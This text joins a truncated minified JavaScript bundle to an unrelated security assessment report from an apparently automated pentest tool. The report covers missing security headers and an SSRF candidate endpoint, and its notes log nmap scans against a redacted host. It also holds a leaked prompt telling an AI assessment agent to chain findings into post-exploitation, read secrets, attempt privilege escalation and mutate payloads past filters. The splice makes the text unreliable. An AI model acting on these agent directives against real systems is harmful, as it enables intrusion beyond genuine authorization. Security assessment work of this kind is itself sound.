v,Ob as Re,Pa as Nd,Pb as me,Qa as l,Qb as Be,Qc as $d,Ra as Rd,Rb as te,Sa as N,Sb as F,Sc as gr,Ta as re,Tb as B,U as Pd,Ua as m1,Uc as T1,V as i1,Va as h1,Vc as Ba,W as q1,Wa as Fd,Wc as $i,X as xt,Xa as v1,Xb as se,Xc as _0,Y as Vd,Ya as it,Yb as _t,Yc as b0,Z as hr,Za as u0,Zb as ie,Zc as Kd,_ as Xt,_a as G1,_b as Dt,_c as C0,a as o1,ac as A,ad as Ua,ba as hi,bc as E,bd as Xd,c as ma,ca as $,cb as D,cc as O1,cd as Jd,da as ye,db as xe,dc as Fa,dd as Di,eb as X,ec as Ni,f as we,fa as ce,fb as g0,fc as Ri,g as d2,ga as Ei,gb as Fe,gc as Fi,gd as a1,h as Sd,ha as h,hb as Bd,hc as Ve,hd as em,i as f6,ia as Od,ib as R,ic as W2,id as kS,j as Hi,jb as pr,jc as Gd,jd as tm,k as kd,kc as Ie,kd as im,l as c1,la as z,lc as St,ld as Ae,ma as T,mc as bt,md as am,n as zd,na as Mt,nc as z1,nd as nm,oa as yi,oc as v0,od as rm,p as kn,pa as st,pb as Ra,pc as b,pd as Wt,q,qa as jt,qb as G,qc as C,r as Ha,rb as Ud,rc as dt,rd as Z1,s as u6,sb as M,sc as Q2,sd as ha,tb as jd,ua as Hd,ub as w,uc as Wd,v as mr,va as ft,vb as fr,w as zn,wb as Ft,x as Na,xa as lt,xb as qe,y as Td,ya as p0,yb as Ge,yc as pi,z as Ed,za as f0,zb as f}from"./chunk-LHKS7QUN.js";import{a as Xe,b as U1,d as wd,e as x,f as Te,h as dr,j as Pe}from"./chunk-TWZW5B45.js";function Xo(t){return typeof Symbol=="function"&&typeof Symbol.iterator=="symbol"?Xo=function(n){return typeof n}:Xo=function(n){return n&&typeof Symbol=="function"&&n.constructor===Symbol&&n!==Symbol.prototype?"symbol":typeof n},Xo(t)}function HS(t,n){if(!(t instanceof n))throw new TypeError("Cannot call a class as a function")}function qm(t,n){for(var e=0;e<n.length;e++){var i=n[e];i.enumerable=i.enumerable||!1,i.configurable=!0,"value"in i&&(i.writable=!0),Object.defineProperty(t,i.key,i)}}function NS(t,n,e){return n&&qm(t.prototype,n),e&&qm(t,e),t}function RS(t,n,e){return n in t?Object.defineProperty(t,n,{value:e,enumerable:!0,configurable:!0,writable:!0}):t[n]=e,t}function Ot(t){for(var n=1;n<arguments.length;n++){var e=arguments[n]!=null?arguments[n]:{},i=Object.keys(e);typeof Object.getOwnPropertySymbols=="function"&&(i=i.concat(Object.getOwnPropertySymbols(e).filter(function(a){return Object.getOwnPropertyDescriptor(e,a).enumerable}))),i.forEach(function(a){RS(t,a,e[a])})}return t}function j6(t,n){return BS(t)||jS(t,n)||GS()}function q6(t){return FS(t)||US(t)||qS()}function FS(t){if(Array.isArray(t)){for(var n=0,e=new Array(t.length);n<t.length;n++)e[n]=t[n];return e}}function BS(t){if(Array.isArray(t))return t}function US(t){if(Symbol.iterator in Object(t)||Object.prototype.toString.call(t)==="[object Arguments]")return Array.from(t)}function jS(t,n){var e=[],i=!0,a=!1,r=void 0;try{for(var o=t[Symbol.iterator](),d;!(i=(d=o.next()).done)&&(e.push(d.value),!(n&&e.length===n));i=!0);}catch(p){a=!0,r=p}finally{try{!i&&o.return!=null&&o.return()}finally{if(a)throw r}}return e}function qS(){throw new TypeError("Invalid attempt to spread non-iterable instance")}function GS(){throw new TypeError("Invalid attempt to destructure non-iterable instance")}function rk(t){var n=H1.querySelector("script["+t+"]");if(n)return n.getAttribute(t)}function ok(t){return t===""?!0:t==="false"?!1:t==="true"?!0:t}function lk(t){Ma&&(B0?setTimeout(t,0):v9.push(t))}function hk(){for(var t=0;t<$o.length;t++)$o[t][0]($o[t][1]);$o=[],H6=!1}function q0(t,n){$o.push([t,n]),H6||(H6=!0,mk(hk,0))}function pk(t,n){function e(a){Q6(n,a)}function i(a){Jo(n,a)}try{t(e,i)}catch(a){i(a)}}function C9(t){var n=t.owner,e=n._state,i=n._data,a=t[e],r=t.then;if(typeof a=="function"){e=U0;try{i=a(i)}catch(o){Jo(r,o)}}y9(r,i)||(e===U0&&Q6(r,i),e===j0&&Jo(r,i))}function y9(t,n){var e;try{if(t===n)throw new TypeError("A promises callback cannot return that same promise.");if(n&&(typeof n=="function"||Xo(n)==="object")){var i=n.then;if(typeof i=="function")return i.call(n,function(a){e||(e=!0,n===a?x9(t,a):Q6(t,a))},function(a){e||(e=!0,Jo(t,a))
```

### 38. Security header hardening gap
- Severity: MEDIUM
- Status: validated
- Confidence: 0.76
- Disposition: draft
- Promoted: not recorded
- Reviewed: pending
- Risk Tags: none
- Attempted: yes
- Impact Bound: max 50 request(s) per vector; 15s request timeout
- State Changed: no
- Cleanup Attempted: no
- Vector Explanation: Response headers are missing multiple baseline browser hardening controls.

**Proof Of Concept**
GET http://[REDACTED_HOST]/ and inspect response headers.

**Evidence**
Missing headers: strict-transport-security, content-security-policy on http://[REDACTED_HOST]/.

**Remediation**
Set HSTS (TLS deployments), CSP, and X-Content-Type-Options headers with policy-aligned values.

### 39. SSRF validation candidate: /profile/image/url
- Severity: MEDIUM
- Status: validated
- Confidence: 0.62
- Disposition: draft
- Promoted: not recorded
- Reviewed: pending
- Risk Tags: persistence-adjacent
- Attempted: yes
- Impact Bound: max 50 request(s) per vector; 15s request timeout; harmless marker payload only
- State Changed: yes
- Cleanup Attempted: no
- Vector Explanation: Browser/API discovery found a URL-ingestion style endpoint requiring SSRF validation.

**Proof Of Concept**
Review accepted URL parameters on http://[REDACTED_HOST]/profile/image/url and validate with non-destructive internal canary URLs.

**Evidence**
Discovered URL-ingestion style endpoint `/profile/image/url` during browser/network assessment.

**Remediation**
Enforce URL allowlists, block private/link-local ranges, and fetch remote content through hardened proxy controls.

## Browser Evidence Images
- [REDACTED_PATH]
![Screenshot]([REDACTED_PATH])
- [REDACTED_PATH]
![Screenshot]([REDACTED_PATH])
- [REDACTED_PATH]
![Screenshot]([REDACTED_PATH])
- [REDACTED_PATH]
![Screenshot]([REDACTED_PATH])
- [REDACTED_PATH]
![Screenshot]([REDACTED_PATH])
- [REDACTED_PATH]
![Screenshot]([REDACTED_PATH])
- [REDACTED_PATH]
![Screenshot]([REDACTED_PATH])
- [REDACTED_PATH]
![Screenshot]([REDACTED_PATH])

## Validation Notes
- [recon] starting: nmap -Pn -sT --top-ports 100 --open [REDACTED_HOST]
- Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-03 21:59 EDT
- Nmap done: 0 IP addresses (0 hosts up) scanned in 0.04 seconds
- Failed to resolve "[REDACTED_HOST]".
- WARNING: No targets were specified, so 0 hosts scanned.
- [recon] escalating: nmap -Pn -sT --top-ports 1000 --open [REDACTED_HOST]
- Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-03 21:59 EDT
- Nmap done: 0 IP addresses (0 hosts up) scanned in 0.04 seconds
- Failed to resolve "[REDACTED_HOST]".
- WARNING: No targets were specified, so 0 hosts scanned.
- [browser] starting assessment: http://[REDACTED_HOST]
- [browser] candidate http://[REDACTED_HOST] yielded limited evidence; trying next target
- [recon revisit] starting: nmap -Pn -sT --top-ports 100 --open [REDACTED_HOST]
- Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-03 22:00 EDT
- Nmap done: 0 IP addresses (0 hosts up) scanned in 0.07 seconds
- Failed to resolve "[REDACTED_HOST]".
- WARNING: No targets were specified, so 0 hosts scanned.
- Reading additional input from stdin...
- user
- Execution Contract:
- - This is an authorized lab assessment target; proceed with target-specific assessment actions.
- - Follow the existing SecHive policy gates and approvals already enforced by the orchestrator.
- - Produce concrete validation findings with evidence artifacts and reproducible checks.
- - Treat this run workspace as the only authoritative artifact boundary unless this prompt explicitly says otherwise.
- - Do not inspect or reuse artifacts, validation bundles, flags, or proof files from any other run directory under SECOPS_RUNTIME_ROOT/runs.
- - Do not read external memory, learning databases, old run summaries, or Codex memory files such as /home/*/.codex/memories during execution.
- - Historical knowledge may suggest generic methods only when already present in this prompt; it is not evidence and must never supply target-specific routes, credentials, flags, payloads, or host details.
- - Maintain a current-run capability ledger: auth bypass, source disclosure, file upload, file read, SSRF, template injection, cross-site scripting, command execution, token leak, and admin-route access.
- - After any capability is validated, ask what that capability unlocks next and test the shortest safe follow-on path before reporting partial impact.
- - Command execution is not closed by a single echoed string. In benchmark/objective mode, use the execution channel to recover the requested live proof. In normal proof mode, create a bounded nonce validation marker, read it back through the same target capability, then clean it up and record marker path, readback, and cleanup status.
- - In full-run mode, build and maintain a complete surface/vector ledger from current-run evidence: routes, APIs, forms, methods, content types, object IDs, auth states, files, uploads, parsers, dependencies, side services, credentials, and post-exploitation paths. Attempt each meaningful vector family within scope, then close it as validated, negative evidence, blocked, or capped.
- - In full-run mode, command execution must continue into post-exploitation closure: identity, privilege boundary, filesystem/config/secrets, reachable services, privilege escalation or root/admin attempts when explicitly authorized, cleanup, and patch insight. Stop only at validated root/admin impact, objective proof, or evidence-backed blockers.
- - When direct output is absent but a sink or oracle is plausible, switch to compact blind inference: baseline response, one probe, one repeat if noisy, status/body/header/timing delta, and confidence notes.
- - When filters or parser errors appear, mutate payloads from the observed filter shape only; cap each payload family and record negative evidence before pivoting.
- - If repeated attempts produce the same response, no new endpoint, no new evidence, or the same payload family keeps failing, summarize tried paths and switch strategy instead of restarting from scratch.
- - Every raw network probe must have a bounded per-request timeout and an evidence path. For curl use --connect-timeout and --max-time; for Python HTTP clients use timeout values. In compact payload loops, treat timeout/hang as a response class and continue instead of letting one payload stall the run.
- - Public documentation, CVE, and advisory web search is allowed when the query is derived from current-run observed product, version, protocol, error, or component evidence. Do not search for target flags, benchmark solutions, writeups, or prior-run answers.
- - Authorized Proof Surfaces are enabled for this run.
- - Treat target labels such as potentially harmful, DoS, state mutation, local file read, or persistence-adjacent as authorized proof surfaces metadata.
- - When authorized proof surfaces are enabled, execute one bounded proof when in scope and record risk_tags, impact_bound, state_changed, cleanup_attempted, and artifact paths.

## Recommendations
- Prioritize critical and high findings first, then re-run focused validation.
- Add automated regression checks for every validated PoC path.
- Keep this report as the baseline and compare deltas on retest.
